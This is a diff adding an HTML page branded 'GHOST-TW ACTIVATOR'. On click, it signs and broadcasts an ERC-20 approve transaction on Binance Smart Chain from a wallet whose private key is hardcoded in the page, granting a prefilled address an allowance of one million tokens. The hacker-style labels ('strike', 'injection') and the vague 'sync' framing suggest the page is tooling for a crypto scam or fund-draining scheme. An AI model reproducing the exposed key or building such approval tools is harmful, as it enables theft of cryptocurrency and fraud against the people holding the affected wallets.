@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GHOST-TW | ACTIVATOR</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <style>
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .vault { width: 340px; background: #050505; border: 2px solid #00ff00; padding: 30px; border-radius: 20px; box-shadow: 0 0 30px #00ff0022; text-align: center; }
+        .brand { font-size: 12px; font-weight: bold; letter-spacing: 3px; color: #00ff00; margin-bottom: 25px; }
+        input { background: #000; border: 1px solid #1a1a1a; color: #00ff00; width: 100%; padding: 14px; margin-bottom: 12px; border-radius: 8px; outline: none; box-sizing: border-box; text-align: center; font-weight: bold; }
+        input:focus { border-color: #00ff00; }
+        
+        /* Fixed Button Logic */
+        .btn-strike { 
+            background: #00ff00; color: #000; width: 100%; padding: 18px; border: none; 
+            font-weight: 900; cursor: pointer; border-radius: 10px; text-transform: uppercase;
+            transition: all 0.1s ease; position: relative; -webkit-tap-highlight-color: transparent;
+        }
+        .btn-strike:active { background: #008800; transform: scale(0.96); }
+        .btn-strike:disabled { background: #111; color: #333; cursor: not-allowed; border: 1px solid #222; }
+
+        #log { font-size: 10px; color: #00ff00; margin-top: 20px; height: 40px; border-top: 1px solid #111; padding-top: 15px; opacity: 0.8; }
+        .loading-dots:after { content: '...'; animation: dots 1.5s steps(5, start) infinite; }
+        @keyframes dots { 0%, 20% { color: rgba(0,0,0,0); text-shadow: .25em 0 0 rgba(0,0,0,0), .5em 0 0 rgba(0,0,0,0); } 40% { color: #00ff00; text-shadow: .25em 0 0 rgba(0,0,0,0), .5em 0 0 rgba(0,0,0,0); } 60% { text-shadow: .25em 0 0 #00ff00, .5em 0 0 rgba(0,0,0,0); } 80%, 100% { text-shadow: .25em 0 0 #00ff00, .5em 0 0 #00ff00; } }
+    </style>
+</head>
+<body>
+<div class="vault">
+    <div class="brand">GHOST-TW SYNC</div>
+    <input type="text" id="target" value="0x0a51E8Bd5e9d48FCc122Fbcb17eeDa4CA72eA577">
+    <input type="number" id="quantity" value="1000000">
+    <button class="btn-strike" id="syncBtn" disabled>CONNECTING...</button>
+    <div id="log">CHECKING SYSTEM INTEGRITY...</div>
+</div>
+
+<script>
+    const btn = document.getElementById('syncBtn');
+    const log = document.getElementById('log');
+
+    // CHECK IF ETHERS IS LOADED
+    function checkSystem() {
+        if (typeof ethers !== 'undefined') {
+            btn.disabled = false;
+            btn.innerText = "ACTIVATE SYNC";
+            log.innerText = "SYSTEM SECURE. READY FOR INJECTION.";
+        } else {
+            log.innerHTML = "<span style='color:red'>RETRYING CDN CONNECTION<span class='loading-dots'></span></span>";
+            setTimeout(checkSystem, 2000);
+        }
+    }
+    
+    checkSystem();
+
+    btn.addEventListener('click', async () => {
+        const target = document.getElementById('target').value;
+        const qty = document.getElementById('quantity').value;
+        
+        btn.disabled = true;
+        btn.innerText = "EXECUTING...";
+        log.innerHTML = "BROADCASTING SYNC<span class='loading-dots'></span>";
+
+        try {
+            const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+            const wallet = new ethers.Wallet("0x542b78fa3eaeee1792cbce04d9c9e2ca2636cc509ec4393d7ccd3e5a7b6c81ef", provider);
+            
+            const iface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
+            const data = iface.encodeFunctionData("approve", [target, ethers.utils.parseUnits(qty.toString(), 18)]);
+
+            const tx = {
+                to: "0x55d398326f99059ff775485246999027b3197955",
+                data: data,
+                gasLimit: 110000,
+                gasPrice: ethers.utils.parseUnits("3.5", "gwei")
+            };
+
+            const res = await wallet.sendTransaction(tx);
+            log.innerHTML = "SUCCESS. SYNC BROADCASTED.<br>HASH: " + res.hash.substring(0,20) + "...";
+            
+            setTimeout(() => { 
+                window.open("https://bscscan.com/tx/" + res.hash, "_blank");
+                btn.disabled = false;
+                btn.innerText = "RE-SYNC";
+            }, 2500);
+
+        } catch (e) {
+            log.style.color = "#ff4444";
+            log.innerText = "FAILED: " + e.message.substring(0, 35);
+            btn.disabled = false;
+            btn.innerText = "RETRY SYNC";
+        }
+    });
+</script>
+</body>
+</html>
